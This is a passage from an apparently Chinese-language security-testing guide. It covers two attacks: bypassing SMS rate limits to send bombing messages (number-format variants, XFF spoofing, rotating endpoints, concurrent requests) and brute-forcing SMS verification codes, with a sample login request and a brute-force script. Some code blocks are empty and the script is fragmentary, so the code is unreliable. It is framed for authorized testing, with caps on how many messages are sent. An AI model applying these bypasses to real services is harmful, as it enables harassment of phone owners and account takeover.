预期结果：变体手机号也能收到短信 → 去重绕过成立。注意短信可能发到同一号码（运营商按号段解析）。

> [!tip] 每轮发送后记录"手机号写法 + 是否收到"，同一号码多种写法都能收到，就是去重缺陷的铁证。

#### 第 5 步：换接口与并发分散
若每个接口各自计数：注册、登录、找回密码三个入口共用同一个短信服务商但**各自的频控 key 独立**，就在三个接口间轮换发送，总频率翻三倍。若限制是"60 秒 1 条"，用并发 10 个请求同时发出，全部通过（限制是计数非令牌桶时有效）。


```http

```

预期结果：三个场景轮换后发送总数超过单场景限制 → 分散绕过成立。

#### 第 6 步：汇总判定
整理证据：发送接口 | 绕过手段 | 实际发送条数 | 是否受限。判定：**任一手机号在无图形验证码前提下可被高频发送短信**（无论哪种绕过），短信轰炸漏洞即成立。控制总发送量在自己号码上 ≤ 20 条、他人号码 ≤ 3 条。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 发送前要图形验证码 | 有图码前置（防轰炸的第一道闸） | 先解图码（c-image-captcha），或找没有图码的其他短信接口 |
| 带 XFF 还是被限 | 计数基于真实 IP 或手机号 | 换参数变体（+86/空格）或换 scene 分散 |
| 变体手机号收不到短信 | 服务端归一化后去重了 | 记录变体都被去重 = 有防护；试并发手段 |
| 并发 10 个只有 1-2 条到达 | 服务端有令牌桶/滑动窗口限流 | 该限制较健壮，记录后停止，别硬刷 |
| 自己号码收不到短信 | 运营商对测试号风控 | 换靶场提供号码或另一个测试号 |

#### 实战要点
- 验证顺序：基本频控 → XFF → 参数变体 → 换接口 → 并发，每层都记录"是否绕过"
- 危害评估关注三要素：**无图码、无频控、可指定任意手机号**，三者齐备就是高危
- 对自己号码做验证，对他人号码最多确认存在（1-3 条），报告注明"未大规模轰炸"

### [c-sms-crack] 验证码爆破 | medium | 验证码爆破;短信验证码 | 验证码枚举

#### 这个条目的作用

#### 第 1 步：确认验证码形态
用测试手机号正常收一条验证码，确认位数与字符集：纯数字 4 位（1 万组合）还是 6 位（100 万组合），还是含字母（组合空间更大，爆破性价比骤降）。同时抓提交接口，确认提交格式与参数名。

```http

Host: target.com
Content-Type: application/json

{"phone": "13800000000", "code": "123456", "scene": "login"}
```

预期结果：记录位数、提交接口、参数名。4 位纯数字 → 值得爆破；6 位带字母 → 先看第 5 步回显。

> [!tip] 有的短信文案会写"验证码 123456，5 分钟内有效"，顺带确认了有效期。

#### 第 2 步：测错误次数限制（爆破前提）
连续提交 10 个**错误**验证码，观察：第几次开始拒绝？是否有"错误次数过多，请重新获取"？是否出现延迟（每次越来越慢）？是否锁定后还能继续提交？关键判定：**连续错 10-20 次仍可继续提交** → 无错误限制，可爆破。

#### 第 3 步：写爆破脚本（4 位数字）

```python
s = requests.Session()

    return r

    # 命中判定：状态码或响应体与错误时不同

        print(r.text[:200])
        break
    if code % 100 == 0:

```

整理证据：验证码位数 | 错误次数限制 | 有效期 | 回显 | 爆破结果。判定：**验证码可在不锁定前提下被枚举命中** = 爆破漏洞。6 位数字（100 万组合）若确认无限制也值得跑，但先测速率与风控（见常见错误表），评估耗时与请求量再决定。
